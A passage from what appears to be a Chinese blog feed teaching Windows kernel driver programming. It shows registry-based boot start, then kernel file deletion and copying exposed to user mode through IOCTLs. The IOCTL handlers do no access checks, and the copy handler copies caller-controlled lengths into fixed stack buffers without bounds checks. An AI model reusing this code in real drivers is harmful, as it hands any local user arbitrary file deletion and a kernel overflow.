&#125;</span><br><span class="line">    PKEY_VALUE_PARTIAL_INFORMATION tempinfo = (PKEY_VALUE_PARTIAL_INFORMATION)KeyInfo;</span><br><span class="line">    PWCHAR tempName = (PWCHAR)(tempinfo-&gt;Data);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;reg: %wZ, key: %wZ, Value: %ws\n&quot;</span>, RegistryPath,regKeyName, tempName);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ZwClose</span>(hRegKey);</span><br><span class="line">    <span class="built_in">ExFreePool</span>(KeyInfo);</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/3fa2d8bb5f3f4488544999bdab3c0d88.png" alt="image-20240318134033598" /></p><p>再加上<code>ZwSetValue</code>和之前的文件复制，就能实现这个功能了，但是需要更多的技巧来提升启动时的运行位置更早。</p><p>也可以使用微软封装函数<code>RtlWriteRegistryValue</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;使用内核注册表实现开机启动驱动等&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="kernel" scheme="https://joe1sn.eu.org/categories/notes/kernel/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>windows内核驱动 3-文件操作</title>
    <link href="https://joe1sn.eu.org/2024/03/17/windows-kernel-driver-3/"/>
    <id>https://joe1sn.eu.org/2024/03/17/windows-kernel-driver-3/</id>
    <published>2024-03-17T08:51:33.000Z</published>
    <updated>2024-03-17T13:02:22.861Z</updated>
    
    <content type="html"><![CDATA[<p>之前写过：<a href="https://joe1sn.eu.org/2023/02/16/windows_kernel_driver_1/">windows内核驱动 1-环境搭建</a>、<a href="https://joe1sn.eu.org/2023/02/17/windows_kernel_driver_2/">windows内核驱动 2-页表探索</a></p><p>但是内容确实有点衔接不上，这里根据<a href="https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/">【Win Pwn】HEVD-内核栈溢出(上)</a>中展示的基础技巧来继续</p><span id="more"></span><h1 id="项目结构优化"><a class="markdownIt-Anchor" href="#项目结构优化"></a> 项目结构优化</h1><p><img src="https://img.joe1sn.top/uploads/big/74db52682cbce590b8491fd618edceff.png" alt="image-20240317165802241" /></p><p>之前写过的所有功能都在<code>main.c</code>中，新加入<code>IoctlFuncs</code>，这里来写所有的ioctl功能，那么就要重新设计<code>MyControl</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">PIO_STACK_LOCATION pStack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(pIrp);</span><br><span class="line">ULONG ioCode = pStack-&gt;Parameters.DeviceIoControl.IoControlCode;</span><br><span class="line">ULONG inLen = pStack-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line"></span><br><span class="line">ULONG ioInfo = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">switch</span> (ioCode)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> IOCTL_MUL:</span><br><span class="line">&#123;</span><br><span class="line">    DWORDLONG inData = *(PDWORDLONG)pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Kernel Recive: %d, Len: %lld\n&quot;</span>, inData, inLen);</span><br><span class="line">    inData *= <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Kernel Data %d\n&quot;</span>, inData);</span><br><span class="line">    *(PDWORDLONG)pIrp-&gt;AssociatedIrp.SystemBuffer = inData;</span><br><span class="line">    ioInfo = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    RET = STATUS_UNSUCCESSFUL;</span><br><span class="line">    ioInfo = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里分析得到我们需要的函数，大概可以声明为</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ULONG <span class="title">Mul</span><span class="params">(PIRP pIrp)</span> </span>&#123;</span><br><span class="line">    PIO_STACK_LOCATION pStack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(pIrp);</span><br><span class="line">    ULONG inLen = pStack-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line">    DWORDLONG inData = *(PDWORDLONG)pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Kernel Recive: %d, Len: %lld\n&quot;</span>, inData, inLen);</span><br><span class="line">    inData *= <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Kernel Data %d\n&quot;</span>, inData);</span><br><span class="line">    *(PDWORDLONG)pIrp-&gt;AssociatedIrp.SystemBuffer = inData;</span><br><span class="line">    <span class="keyword">return</span> (ULONG)inData;</span><br><span class="line">    <span class="comment">//return 4;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意新建的文件要以<code>.c</code>结尾</p><p><img src="https://img.joe1sn.top/uploads/big/07c3633604ed202bd0922197da264525.png" alt="image-20240317171836424" /></p><h1 id="文件操作"><a class="markdownIt-Anchor" href="#文件操作"></a> 文件操作</h1><ul><li><code>ZwXXXX</code> -&gt; <code>系统检查</code> -&gt; <code>NtXXXX</code></li><li>R3下都一样</li></ul><h2 id="文件删除"><a class="markdownIt-Anchor" href="#文件删除"></a> 文件删除</h2><p>使用到的API是</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSYSAPI NTSTATUS <span class="title">ZwDeleteFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] POBJECT_ATTRIBUTES ObjectAttributes</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>参数为</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_OBJECT_ATTRIBUTES</span> &#123;</span><br><span class="line">  ULONG           Length;</span><br><span class="line">  HANDLE          RootDirectory;</span><br><span class="line">  PUNICODE_STRING ObjectName;</span><br><span class="line">  ULONG           Attributes;</span><br><span class="line">  PVOID           SecurityDescriptor;</span><br><span class="line">  PVOID           SecurityQualityOfService;</span><br><span class="line">&#125; OBJECT_ATTRIBUTES;</span><br></pre></td></tr></table></figure><p>初始化改参数的api</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">InitializeObjectAttributes</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          POBJECT_ATTRIBUTES   p,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           PUNICODE_STRING      n,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG                a,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           HANDLE               r,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] PSECURITY_DESCRIPTOR s</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>整个函数以及使用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">KernelDeleteFile</span><span class="params">(PWCHAR filePath)</span> </span>&#123;</span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    UNICODE_STRING FilePath = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;FilePath, filePath);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;[Kernel Delete File] The File Path is %wZ\n&quot;</span>, FilePath);</span><br><span class="line"></span><br><span class="line">    OBJECT_ATTRIBUTES FileAttribute = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">InitializeObjectAttributes</span>(&amp;FileAttribute, &amp;FilePath, OBJ_CASE_INSENSITIVE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    status = <span class="built_in">ZwDeleteFile</span>(&amp;FileAttribute);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status))</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create Device Failed: %x\n&quot;</span>, status);</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT  DriverObject, PUNICODE_STRING RegistryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//.........</span></span><br><span class="line">    <span class="built_in">KernelDeleteFile</span>(<span class="string">L&quot;\\??\\C:\\exp.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/eac1ddebf14c4632fc4ed20ec4c1c2bd.png" alt="image-20240317174745958" /></p><h2 id="文件复制"><a class="markdownIt-Anchor" href="#文件复制"></a> 文件复制</h2><p>属于是把大象装进冰箱分几步</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">KernelCopyFile</span><span class="params">(PWCHAR dstFile, PWCHAR srcFile)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1-Declear Related Variable</span></span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    UNICODE_STRING DstFilePath = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    UNICODE_STRING SrcFilePath = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;DstFilePath, dstFile);</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;SrcFilePath, srcFile);</span><br><span class="line">    IO_STATUS_BLOCK IoBlock = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    HANDLE hSrcFile = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE hDstFile = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//----------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2-Init Related Variable</span></span><br><span class="line">    OBJECT_ATTRIBUTES DstFileAttribute = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    OBJECT_ATTRIBUTES SrcFileAttribute = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">InitializeObjectAttributes</span>(&amp;DstFileAttribute, &amp;DstFilePath, OBJ_CASE_INSENSITIVE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">InitializeObjectAttributes</span>(&amp;SrcFileAttribute, &amp;SrcFilePath, OBJ_CASE_INSENSITIVE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3-Open File</span></span><br><span class="line">    status = <span class="built_in">ZwOpenFile</span>(&amp;hSrcFile, GENERIC_ALL, &amp;SrcFileAttribute, &amp;IoBlock, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_SYNCHRONOUS_IO_NONALERT);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Open File %wZ Failed, status: %x\n&quot;</span>, SrcFilePath, status);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4-Get Source File Size &amp; Allocate Transfer Buffer</span></span><br><span class="line">    FILE_STANDARD_INFORMATION StdFileInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    status = <span class="built_in">ZwQueryInformationFile</span>(hSrcFile, &amp;IoBlock, &amp;StdFileInfo, <span class="built_in">sizeof</span>(FILE_STANDARD_INFORMATION), FileStandardInformation);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Query File %wZ Failed, status: %x\n&quot;</span>, SrcFilePath, status);</span><br><span class="line">        <span class="built_in">ZwClose</span>(hSrcFile);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;IoBlock size %d\n&quot;</span>, IoBlock.Information);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;StdFileInfo size %d\n&quot;</span>, StdFileInfo.EndOfFile.QuadPart);</span><br><span class="line"></span><br><span class="line">    PVOID Transfer = <span class="built_in">ExAllocatePool2</span>(POOL_FLAG_NON_PAGED, StdFileInfo.EndOfFile.QuadPart, <span class="string">&#x27;ymym&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (Transfer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;ExAllocatePool Transfer Buffer Failed, status: %x\n&quot;</span>, status);</span><br><span class="line">        <span class="built_in">ZwClose</span>(hSrcFile);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>(Transfer, StdFileInfo.EndOfFile.QuadPart);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5-Read Source File To Buffer</span></span><br><span class="line">    LARGE_INTEGER TempReadCount = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    status = <span class="built_in">ZwReadFile</span>(hSrcFile, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;IoBlock, Transfer, (ULONG)StdFileInfo.EndOfFile.QuadPart, &amp;TempReadCount, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Read to Transfer Buffer Failed, status: %x\n&quot;</span>, status);</span><br><span class="line">        <span class="built_in">ExFreePool</span>(Transfer);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Io info: %d&quot;</span>, IoBlock.Information);</span><br><span class="line">    <span class="built_in">ZwClose</span>(hSrcFile);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6-Create New File</span></span><br><span class="line">    status = <span class="built_in">ZwCreateFile</span>(&amp;hDstFile, GENERIC_ALL, &amp;DstFileAttribute, &amp;IoBlock, <span class="literal">NULL</span>, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_SUPERSEDE, FILE_SYNCHRONOUS_IO_NONALERT, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create File Failed, status: %x\n&quot;</span>, status);</span><br><span class="line">        <span class="built_in">ExFreePool</span>(Transfer);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 7-Write to New File</span></span><br><span class="line">    status = <span class="built_in">ZwWriteFile</span>(hDstFile, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;IoBlock, Transfer, (ULONG)StdFileInfo.EndOfFile.QuadPart, &amp;TempReadCount, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Write File Failed, status: %x\n&quot;</span>, status);</span><br><span class="line">        <span class="built_in">ExFreePool</span>(Transfer);</span><br><span class="line">        <span class="built_in">ZwClose</span>(hDstFile);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ZwClose</span>(hDstFile);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Write %d\n&quot;</span>, IoBlock.Information);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Created New File %wZ\n&quot;</span>, DstFilePath);</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/3bbaf0ee5dc7ec78365d41efcecc1872.png" alt="image-20240317193310825" /></p><h1 id="优化到ioctl"><a class="markdownIt-Anchor" href="#优化到ioctl"></a> 优化到IOCTL</h1><h2 id="文件删除-2"><a class="markdownIt-Anchor" href="#文件删除-2"></a> 文件删除</h2><p>驱动</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">KernelDeleteFile</span><span class="params">(PIRP pIrp)</span> </span>&#123;</span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    PIO_STACK_LOCATION pStack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(pIrp);</span><br><span class="line">    ULONG filePathLen = pStack-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line">    </span><br><span class="line">    WCHAR filePath[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">// = pIrp-&gt;AssociatedIrp.SystemBuffer;</span></span><br><span class="line">    <span class="keyword">if</span> (filePathLen &gt;= <span class="number">0x1000</span>) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Size of file path is too big\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    UNICODE_STRING FilePath = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>(filePath, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>(filePath, pIrp-&gt;AssociatedIrp.SystemBuffer, filePathLen);</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;FilePath, filePath);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Now Delete File %wZ\n&quot;</span>, FilePath);</span><br><span class="line"></span><br><span class="line">    OBJECT_ATTRIBUTES FileAttribute = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">InitializeObjectAttributes</span>(&amp;FileAttribute, &amp;FilePath, OBJ_CASE_INSENSITIVE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    status = <span class="built_in">ZwDeleteFile</span>(&amp;FileAttribute);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status))</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Delete Device Failed: %x\n&quot;</span>, status);</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">KDeleteFile</span><span class="params">(HANDLE hDevice, <span class="type">const</span> <span class="type">wchar_t</span> filepath[])</span> </span>&#123;</span><br><span class="line">    DWORD info = <span class="number">0</span>;</span><br><span class="line">    std::wstring prefix = <span class="string">L&quot;\\??\\&quot;</span>;</span><br><span class="line">    std::wstring r3path = filepath;</span><br><span class="line">    r3path = prefix + r3path;</span><br><span class="line">    <span class="built_in">DeviceIoControl</span>(hDevice, IOCTL_DELETE_FILE, (LPVOID)r3path.<span class="built_in">c_str</span>(), (r3path.<span class="built_in">size</span>()) * <span class="number">2</span> - <span class="number">1</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;info, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="文件复制-2"><a class="markdownIt-Anchor" href="#文件复制-2"></a> 文件复制</h2><p>驱动</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">KernelCopyFile</span><span class="params">(PIRP pIrp)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0-Get Param</span></span><br><span class="line">    ParamKernelCopyFile Param = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    WCHAR dstFile[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    WCHAR srcFile[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>(dstFile, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>(srcFile, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>((PVOID)&amp;Param, pIrp-&gt;AssociatedIrp.SystemBuffer, <span class="built_in">sizeof</span>(ParamKernelCopyFile));</span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>((PVOID)dstFile, Param.dstFile, Param.dstFileLen);</span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>((PVOID)srcFile, Param.srcFile, Param.srcFileLen);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//DbgPrint(&quot;&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1-Declear Related Variable</span></span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    UNICODE_STRING DstFilePath = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    UNICODE_STRING SrcFilePath = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;DstFilePath, dstFile);</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;SrcFilePath, srcFile);</span><br><span class="line">    IO_STATUS_BLOCK IoBlock = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    HANDLE hSrcFile = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE hDstFile = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//----------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2-Init Related Variable</span></span><br><span class="line">    OBJECT_ATTRIBUTES DstFileAttribute = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    OBJECT_ATTRIBUTES SrcFileAttribute = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">InitializeObjectAttributes</span>(&amp;DstFileAttribute, &amp;DstFilePath, OBJ_CASE_INSENSITIVE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">InitializeObjectAttributes</span>(&amp;SrcFileAttribute, &amp;SrcFilePath, OBJ_CASE_INSENSITIVE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3-Open File</span></span><br><span class="line">    status = <span class="built_in">ZwOpenFile</span>(&amp;hSrcFile, GENERIC_ALL, 